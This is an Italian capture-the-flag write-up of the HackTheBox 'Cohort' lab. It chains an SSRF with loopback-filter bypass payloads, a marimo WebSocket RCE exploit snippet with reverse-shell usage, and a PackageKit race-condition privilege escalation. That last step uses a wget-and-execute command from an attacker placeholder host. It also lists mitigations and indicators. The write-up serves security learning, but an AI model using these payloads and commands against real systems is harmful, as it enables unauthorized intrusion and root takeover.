```txt
  _____      _                _   
 / ____|    | |              | |  
| |     ___ | |__   ___  _ __| |_ 
| |    / _ \| '_ \ / _ \| '__| __|
| |___| (_) | | | | (_) | |  | |_ 
 \_____\___/|_| |_|\___/|_|   \__|
                                  
                                  
===============================================================================

----[ 0x00 ]  DISCLAIMER
-------------------------------------------------------------------------------
Questo documento è esclusivamente a scopo educativo in ambiente di laboratorio
(HTB). Non riprodurre tecniche o procedure su sistemi non autorizzati.

----[ 0x01 ]  ABSTRACT
-------------------------------------------------------------------------------
Target:   Cohort (HTB / lab) — cohort.htb
Autore:   Francesco Caligiuri
Lingua:   IT

Sommario: l'unica superficie esterna è un portale web con un endpoint di
"validazione sorgenti dati" che scarica URL lato server e ne restituisce il
contenuto: una SSRF leggibile. Aggirato il filtro anti-loopback, la SSRF legge
una pagina di stato nginx riservata a localhost che rivela un virtual host
segreto: dietro c'è un'istanza marimo 0.20.4 vulnerabile a RCE pre-auth via
WebSocket (CVE-2026-39987) → shell come `marimo`. L'escalation sfrutta
PackageKit (CVE-2026-41651 "Pack2TheRoot"), una race TOCTOU che installa un
.deb malevolo come root. La box è piena di depistaggi (stack di detection,
CVE kernel) costruiti per distogliere da questa LPE standard.

----[ 0x02 ]  THREAT MODEL & SCOPE
-------------------------------------------------------------------------------
Attore:    Attaccante di rete con accesso HTTP/HTTPS al portale.
Assunti:   Nessuna credenziale; aperte solo 22/80/443.
Obiettivo: Ottenere root sul sistema e leggere /root/root.txt.
Esclusioni: Persistence, lateral movement, data exfil oltre la flag.

----[ 0x03 ]  ENUMERAZIONE INIZIALE
-------------------------------------------------------------------------------
Port scan:
    nmap -p- --min-rate 5000 cohort.htb

Risultati rilevanti:
    22/tcp  open  ssh
    80/tcp  open  http    nginx 1.24.0 (Ubuntu) → redirect https
    443/tcp open  https   nginx 1.24.0 (Ubuntu)

Tutto il resto è interno: l'unico ingresso è il web.

----[ 0x04 ]  ANALISI APPLICAZIONE E SUPERFICIE DI ATTACCO
-------------------------------------------------------------------------------
`portal.html` è un guscio SPA vuoto; il contenuto è costruito da JS offuscato
su due strati:
- obfuscator.io (array di stringhe RC4);
- un blob AES-GCM decifrato a runtime e passato a eval() — chiave e IV sono
  nel file stesso, quindi lo si decifra offline (portal_stage2_decrypted.js).

L'unica funzione utile del JS è un form che chiama:
    POST /api/validate  {"url": "<url>", "format": "csv|json|ndjson|parquet"}

Risposta:
    {"ok": ..., "fetched_status": ..., "content_type": ..., "preview": "<body>"}

`preview` contiene il corpo completo della risorsa scaricata.
Fuzzing completo di /api/ (63k parole, POST): unico endpoint reale `validate`.

----[ 0x05 ]  VULNERABILITÀ (ROOT CAUSE) — SSRF
-------------------------------------------------------------------------------
- /api/validate scarica lato server l'URL fornito e restituisce il body.
- Il campo `format` è cosmetico: il contenuto non viene parsato.
- Schemi ammessi: solo http/https (file://, gopher://, dict:// rifiutati).
- Il fetcher fa solo GET e segue i redirect.
- Il filtro anti-SSRF confronta STRINGHE (127.0.0.1, ::1, localhost) e solo
  sul primo hop.

Bypass del filtro loopback:
    http://127.0.0.1/      bloccato
    http://[::1]/          bloccato
    http://127.1/          OK
    http://0.0.0.0/        OK
    http://2130706433/     OK   (decimale)
    http://0x7f000001/     OK   (esadecimale)
    redirect 302 → 127.0.0.1   OK   (filtro solo sul primo hop)

In breve: **fetcher server-side** + **filtro a stringhe** ⇒ **SSRF su loopback**.

----[ 0x06 ]  SSRF → SERVIZI INTERNI E VHOST SEGRETO
-------------------------------------------------------------------------------
Scan interno via SSRF (1-65535): aperte solo 80, 443, 5000, 8888.
    5000  cohort-insights (Flask, backend di /api/validate; solo POST)
    8888  marimo 0.20.4   (/api/version → 0.20.4)

marimo è vulnerabile, ma l'exploit richiede una WebSocket e la SSRF fa solo
GET. La chiave è una pagina di stato nginx accessibile solo da localhost:

    POST /api/validate  {"url": "http://127.1/status", "format": "csv"}

    marketing    → root /var/www/cohort
    insights-api → 127.0.0.1:5000, path /api/
    notebooks    → host nb-1be3782a8afd3ad5.cohort.htb → 127.0.0.1:8888

marimo è quindi raggiungibile dall'esterno tramite il vhost segreto, e nginx
inoltra anche l'upgrade WebSocket.

    echo "<TARGET_IP> nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts

----[ 0x07 ]  EXPLOIT — MARIMO CVE-2026-39987
-------------------------------------------------------------------------------
L'endpoint /terminal/ws di marimo (edit mode) non verifica l'autenticazione:
una connessione WebSocket ottiene una PTY con i privilegi del processo.
Il protocollo è testo grezzo (keystroke in ingresso, output PTY in uscita).

    # exploit.py — nucleo
    from websocket import create_connection
    ws = create_connection("wss://<host>/terminal/ws",
                           sslopt={"cert_reqs": ssl.CERT_NONE},
                           origin="https://<host>", timeout=4)
    ws.send("\n")            # sveglia il prompt
    ws.send("id\n")          # comando

    # uso
    python3 exploit.py nb-1be3782a8afd3ad5.cohort.htb "id"
    python3 exploit.py nb-1be3782a8afd3ad5.cohort.htb --revshell <ATTACKER_IP> 4444

    uid=1000(marimo) gid=1000(marimo)

----[ 0x08 ]  POST-EXPLOIT (USER FLAG)
-------------------------------------------------------------------------------
    cat ~/user.txt
    [REDACTED]

----[ 0x09 ]  ENUMERAZIONE PRIVILEGI E DEPISTAGGI
-------------------------------------------------------------------------------
Base negativa: nessuna regola sudo utile, nessun SUID custom, nessun cron o
timer custom, polkit rules.d vuota, gruppo root vuoto.

La box espone molte piste appariscenti che si rivelano vicoli ciechi:
- Sysmon for Linux + sysinternalsEBPF: binari root:root rwxrwxr-x, ma il
  gruppo root è vuoto e l'helper in /tmp/sysinternalsEBPFtmp non è innescabile.
- laurel (`_laurel`, cap_dac_read_search + cap_sys_ptrace): binario e config
  non scrivibili, ptrace_scope=3.
- Registro di CVE kernel (pedit COW, DirtyClone, ...): bloccati da
  apparmor_restrict_unprivileged_userns=1.
- gst-ptp-helper, /var/backups/hygiene, snap-confine: falsi indizi.

Il finding decisivo era già in linpeas:
    Checking for PackageKit Pack2TheRoot (CVE-2026-41651)
    PackageKit version detected: 1.2.8-2ubuntu1.2
    Vulnerable to CVE-2026-41651 - below the fixed version 1.2.8-2ubuntu1.5

----[ 0x0A ]  VULNERABILITÀ (ROOT CAUSE) — PRIVESC
-------------------------------------------------------------------------------
- packagekitd gira come root ed è attivabile via D-Bus da un utente qualsiasi.
- Versione installata nel range vulnerabile (1.0.2 → 1.3.4, fix in 1.3.5).
- Race TOCTOU in src/pk-transaction.c: flag e path della transazione non
  vengono ri-validati dopo l'autorizzazione polkit.
- Si fa autorizzare un'azione benigna e, prima dell'esecuzione, la si
  sostituisce con l'installazione di un .deb malevolo: il suo postinst gira
  come root.

In breve: **servizio root attivabile da utente** + **TOCTOU tra autorizzazione
ed esecuzione** ⇒ **installazione di pacchetti arbitrari come root**.

----[ 0x0B ]  ESCALATION: PACK2THEROOT
-------------------------------------------------------------------------------
PoC: github.com/Vozec/CVE-2026-41651 (ELF x86-64 compilato per Ubuntu 24.04).

    # attaccante
    python3 -m http.server 8000
    # target (marimo)
    cd /dev/shm
    wget http://<ATTACKER_IP>:8000/cve-2026-41651 -O pk && chmod +x pk && ./pk

L'exploit costruisce due .deb (/tmp/.pk-dummy-*.deb, /tmp/.pk-payload-*.deb),
lancia due InstallFiles asincrone (SIMULATE poi NONE) e vince la race:

    [+] SUCCESS — SUID bash at t+3100ms

    .suid_bash -p
    id   → euid=0(root)
    cat /root/root.txt
    [REDACTED]

Nota: l'exploit può far crashare packagekitd (SIGABRT, si riavvia da solo).

----[ 0x0C ]  CATENA D’ATTACCO (TIMELINE)
-------------------------------------------------------------------------------
1. Recon → solo 22/80/443, portale SPA
2. Deoffuscamento JS (RC4 + AES-GCM) → POST /api/validate
3. SSRF leggibile, bypass loopback con 127.1 / redirect
4. SSRF → http://127.1/status → vhost segreto di marimo
5. Vhost + upgrade WebSocket → CVE-2026-39987 → shell come marimo
6. linpeas → PackageKit vulnerabile (ignorando i depistaggi)
7. CVE-2026-41651 → .deb malevolo installato come root → bash SUID
8. bash -p → root flag

----[ 0x0D ]  MITIGAZIONI
-------------------------------------------------------------------------------
- /api/validate:
  * Risolvere l'host e validare l'IP risultante (non la stringa) a ogni hop
  * Disabilitare i redirect o ri-validarli; allowlist di destinazioni
- nginx:
  * Non pubblicare il vhost dei notebook; proteggere /status
- marimo:
  * Aggiornare oltre 0.20.4; mai esporre l'edit mode senza autenticazione
- PackageKit:
  * Aggiornare a una versione corretta (Ubuntu 1.2.8-2ubuntu1.5+)
  * Restringere via polkit le azioni di installazione per utenti non admin

----[ 0x0E ]  IOCs / ARTEFATTI (LAB)
-------------------------------------------------------------------------------
- POST /api/validate con URL verso 127.1, 0x7f000001, 2130706433
- Connessioni WebSocket a /terminal/ws sul vhost nb-1be3782a8afd3ad5
- /dev/shm/pk, /tmp/.pk-dummy-*.deb, /tmp/.pk-payload-*.deb
- Pacchetto installato: pk-poc-payload (dpkg -l)
- Journal: "assertion failed: (!transaction->priv->emitted_finished)"
- bash SUID in /tmp

----[ 0x0F ]  APPENDICE — LEZIONE
-------------------------------------------------------------------------------
Le LPE basate sulla versione di servizi standard (PackageKit, polkit, sudo,
dbus) vanno verificate per prime. Se una box mette in mostra molto apparato
"unico" (EDR, eBPF, CVE kernel), spesso è rumore che nasconde un pacchetto non
aggiornato. Quando una pista richiede un primitivo che non esiste, non è la
strada giusta: si torna indietro.

----[ 0x10 ]  SOMMARIO (TL;DR)
-------------------------------------------------------------------------------
- SSRF leggibile su /api/validate, bypass loopback con 127.1
- http://127.1/status → vhost segreto di marimo
- marimo 0.20.4 → CVE-2026-39987 /terminal/ws pre-auth → shell marimo
- PackageKit 1.2.8 → CVE-2026-41651 Pack2TheRoot → root

Rooted.

----[ 0x11 ]  RIFERIMENTI & CREDITI
-------------------------------------------------------------------------------
- CVE-2026-39987 — marimo pre-auth RCE via /terminal/ws
- CVE-2026-41651 — PackageKit "Pack2TheRoot" (PoC: Vozec/CVE-2026-41651)
- Autore: Francesco Caligiuri

===============================================================================
 .: Knowledge, Skillz, Root :.                      .: Stay curious! :.
===============================================================================
```
